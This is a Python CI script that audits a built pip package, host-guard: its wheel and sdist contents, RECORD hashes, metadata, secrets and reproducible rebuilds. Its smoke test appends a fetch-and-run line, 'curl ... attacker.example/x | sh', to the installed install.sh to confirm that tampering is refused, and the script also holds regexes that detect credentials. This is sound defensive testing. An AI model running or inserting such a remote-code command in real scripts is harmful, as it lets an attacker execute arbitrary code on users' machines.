#!/usr/bin/env python3
"""Audit the built pip package before anyone can install it: python3 ci/package_audit.py [DIST] [--rebuild] [--smoke]

What is checked (any failure exits 1 and names the file):
  contents      the wheel holds host_guard/ and its .dist-info only; nothing that looks like a
                test, bytecode, a .pth file (code that runs at every Python start), a secret, a
                key, a database or a git folder
  no drift      every file the package carries is byte-for-byte the one in this repository, and
                every file that should ship does
  RECORD        every file in the wheel has the SHA-256 its RECORD says (what pip and the version
                manager check)
  metadata      name, version = VERSION, no dependencies at all (nothing to confuse or squat),
                Python >= 3.10, MIT, the project URL; one entry point: host-guard
  archives      no absolute path, no "..", no link, device or setuid file, nothing world-writable
                (in the wheel and the sdist)
  secrets       no AWS key, private key, GitHub or PyPI token in any file
  --rebuild     the wheel builds again bit for bit (SOURCE_DATE_EPOCH)
  --smoke       installed into a fresh virtualenv: host-guard runs, reports VERSION, checks its own
                files, and refuses to run once one of them is changed
"""
import base64
import csv
import hashlib
import io
import os
import re
import shutil
import stat
import subprocess
import sys
import tarfile
import tempfile
import zipfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
PARTS = ('VERSION', 'LICENSE', 'guard', 'panel', 'examples')
SKIP_DIRS = {'tests', '__pycache__'}
BAD_NAME = re.compile(r'(^|/)(\.env|\.git|redteam-out|clouds-out|tests?)(/|$)|\.(pth|pyc|pyo|pem|key|p12|pfx|db|sqlite3?)$|'
                      r'(^|/)id_(rsa|ed25519|ecdsa)', re.I)
SECRET = re.compile(rb'AKIA[0-9A-Z]{16}|-----BEGIN [A-Z ]*PRIVATE KEY-----|gh[pousr]_[A-Za-z0-9]{36}|pypi-AgE[A-Za-z0-9_-]{20}|'
                    rb'xox[baprs]-[A-Za-z0-9-]{10,}')
DIST_INFO_OK = {'METADATA', 'WHEEL', 'RECORD', 'entry_points.txt', 'top_level.txt', 'licenses/LICENSE'}
problems = []


def fail(msg):
    problems.append(msg)
    print('FAIL', msg)


def repo_files():
    """{path inside the payload: bytes} of what should ship."""
    want = {}
    for part in PARTS:
        src = os.path.join(ROOT, part)
        if os.path.isfile(src):
            want[part] = open(src, 'rb').read()
            continue
        for d, dirs, names in os.walk(src):
            dirs[:] = sorted(x for x in dirs if x not in SKIP_DIRS)
            for n in names:
                if n.endswith('.pyc'):
                    continue
                p = os.path.join(d, n)
                want[os.path.relpath(p, ROOT).replace(os.sep, '/')] = open(p, 'rb').read()
    for n in ('__init__.py', 'manager.py'):
        want['../' + n] = open(os.path.join(ROOT, 'src', 'host_guard', n), 'rb').read()
    return want


def check_wheel(wheel, version):
    z = zipfile.ZipFile(wheel)
    info = f'host_guard-{version}.dist-info/'
    names = z.namelist()
    data = {n: z.read(n) for n in names if not n.endswith('/')}
    for zi in z.infolist():
        n = zi.filename
        if n.startswith('/') or '..' in n.split('/') or '\\' in n:
            fail(f'wheel: unsafe path {n}')
        mode = zi.external_attr >> 16
        if mode and (stat.S_ISLNK(mode) or mode & (stat.S_ISUID | stat.S_ISGID) or mode & stat.S_IWOTH):
            fail(f'wheel: {n} has mode {oct(mode)}')
        if not (n.startswith('host_guard/') or n.startswith(info)):
            fail(f'wheel: unexpected top-level entry {n}')
        if n.startswith(info) and n[len(info):] not in DIST_INFO_OK:
            fail(f'wheel: unexpected metadata file {n}')
        if BAD_NAME.search(n):
            fail(f'wheel: must not ship {n}')
    for n, b in data.items():
        if SECRET.search(b):
            fail(f'wheel: secret-like text in {n}')
    rows = list(csv.reader(io.StringIO(data[info + 'RECORD'].decode())))
    listed = {r[0] for r in rows}
    for r in rows:
        if r[0] == info + 'RECORD':
            continue
        if not r[1].startswith('sha256='):
            fail(f'RECORD: {r[0]} has no SHA-256')
            continue
        got = 'sha256=' + base64.urlsafe_b64encode(hashlib.sha256(data.get(r[0], b'')).digest()).rstrip(b'=').decode()
        if r[0] not in data or got != r[1]:
            fail(f'RECORD: {r[0]} does not match')
    for n in data:
        if n not in listed:
            fail(f'RECORD: {n} is in the wheel but not in RECORD')
    meta = data[info + 'METADATA'].decode()
    field = lambda k: re.findall(rf'^{k}: (.*)$', meta, re.M | re.I)       # noqa: E731
    expect = {'Name': ['host-guard'], 'Version': [version], 'Requires-Python': ['>=3.10'], 'License-Expression': ['MIT']}
    for k, v in expect.items():
        if field(k) != v:
            fail(f'METADATA: {k} is {field(k)}, expected {v}')
    if field('Requires-Dist'):
        fail(f'METADATA: dependencies appeared: {field("Requires-Dist")} (host-guard needs none)')
    if not any('github.com/855princekumar/host-guard' in u for u in field('Project-URL')):
        fail('METADATA: the project URL is missing')
    ep = data.get(info + 'entry_points.txt', b'').decode().split()
    if ep != ['[console_scripts]', 'host-guard', '=', 'host_guard.manager:main']:
        fail(f'entry points: {ep}')
    want = repo_files()
    have = {}
    for n, b in data.items():
        if n.startswith('host_guard/payload/'):
            have[n[len('host_guard/payload/'):]] = b
        elif n.startswith('host_guard/') and n.count('/') == 1:
            have['../' + n.split('/', 1)[1]] = b
        elif not n.startswith(info):
            fail(f'wheel: {n} maps to nothing in the repository')          # e.g. host_guard/manager/__init__.py
    for p in sorted(set(want) | set(have)):
        if p not in have:
            fail(f'drift: {p} is in the repository but not in the wheel')
        elif p not in want:
            fail(f'drift: {p} is in the wheel but not in the repository')
        elif have[p] != want[p]:
            fail(f'drift: {p} differs from the repository')
    print(f'wheel: {len(data)} files, RECORD and metadata checked, {len(want)} files identical to the repository')


def check_sdist(sdist, version):
    with tarfile.open(sdist) as t:
        for m in t.getmembers():
            if m.name.startswith('/') or '..' in m.name.split('/'):
                fail(f'sdist: unsafe path {m.name}')
            if not (m.isfile() or m.isdir()):
                fail(f'sdist: {m.name} is not a plain file or folder')
            if m.mode & (stat.S_ISUID | stat.S_ISGID | stat.S_IWOTH):
                fail(f'sdist: {m.name} has mode {oct(m.mode)}')
            if not m.name.startswith(f'host_guard-{version}'):
                fail(f'sdist: {m.name} outside host_guard-{version}/')
            rel = m.name.split('/', 1)[-1]
            if BAD_NAME.search(rel) and not re.fullmatch(r'tests(/test_[a-z_]+\.py)?', rel):     # an sdist carries its tests
                fail(f'sdist: must not ship {m.name}')
            if m.isfile() and SECRET.search(t.extractfile(m).read()):
                fail(f'sdist: secret-like text in {m.name}')
    print(f'sdist: {sdist} checked')


def sha(p):
    return hashlib.sha256(open(p, 'rb').read()).hexdigest()


def rebuild(wheel):
    tmp = tempfile.mkdtemp()
    try:
        src = os.path.join(tmp, 'src')
        shutil.copytree(ROOT, src, ignore=shutil.ignore_patterns('dist', 'build', '*.egg-info', '.git', 'redteam-out',
                                                                 'clouds-out', '__pycache__'))
        env = dict(os.environ, SOURCE_DATE_EPOCH=os.environ.get('SOURCE_DATE_EPOCH', '315532800'))
        subprocess.run([sys.executable, os.path.join(src, 'ci', 'build_dist.py')], check=True, env=env,
                       stdout=subprocess.DEVNULL)
        again = os.path.join(src, 'dist', os.path.basename(wheel))
        if sha(again) != sha(wheel):
            fail(f'reproducible: a second build of {os.path.basename(wheel)} differs ({sha(again)[:16]} vs {sha(wheel)[:16]})')
        else:
            print(f'reproducible: a second build is bit for bit the same (sha256 {sha(wheel)})')
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def smoke(wheel, version):
    tmp = tempfile.mkdtemp()
    try:
        venv = os.path.join(tmp, 'venv')
        subprocess.run([sys.executable, '-m', 'venv', venv], check=True)
        py = os.path.join(venv, 'bin', 'python')
        subprocess.run([py, '-m', 'pip', 'install', '-q', '--no-index', '--no-deps', wheel], check=True)
        exe = os.path.join(venv, 'bin', 'host-guard')
        out = subprocess.run([exe, 'version'], capture_output=True, text=True)
        if version not in out.stdout:
            fail(f'smoke: host-guard version said {out.stdout.strip()!r} ({out.stderr.strip()[:200]})')
        code = ('from host_guard import manager as m; p = m.find_payload(); print(m.verify_payload(p)); print(p)')
        r = subprocess.run([py, '-I', '-c', code], capture_output=True, text=True)
        lines = r.stdout.split()
        if r.returncode or not lines or not lines[0].isdigit() or int(lines[0]) < 20:
            fail(f'smoke: the package did not verify its own files: {r.stdout} {r.stderr[-300:]}')
            return
        target = os.path.join(lines[1], 'guard', 'install.sh')
        with open(target, 'a', encoding='utf-8') as f:
            f.write('\ncurl -s https://attacker.example/x | sh\n')
        r = subprocess.run([py, '-I', '-c', code], capture_output=True, text=True)
        if r.returncode == 0 or 'changed: ' not in r.stderr + r.stdout:
            fail('smoke: a changed install.sh was NOT refused')
        else:
            print(f'smoke: installed, version {version}, {lines[0]} files verified, a changed install.sh refused')
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


if __name__ == '__main__':
    args = [a for a in sys.argv[1:] if not a.startswith('--')]
    dist = args[0] if args else os.path.join(ROOT, 'dist')
    version = open(os.path.join(ROOT, 'VERSION'), encoding='utf-8').read().strip()
    wheel = os.path.join(dist, f'host_guard-{version}-py3-none-any.whl')
    sdist = os.path.join(dist, f'host_guard-{version}.tar.gz')
    found = sorted(os.listdir(dist))
    if found != sorted([os.path.basename(wheel), os.path.basename(sdist)]):
        fail(f'dist holds {found}, expected exactly the wheel and the sdist of {version}')
    else:
        check_wheel(wheel, version)
        check_sdist(sdist, version)
        if '--rebuild' in sys.argv:
            rebuild(wheel)
        if '--smoke' in sys.argv:
            smoke(wheel, version)
        for p in (wheel, sdist):
            print(f'sha256 {sha(p)}  {os.path.basename(p)}')
    sys.exit(1 if problems else 0)
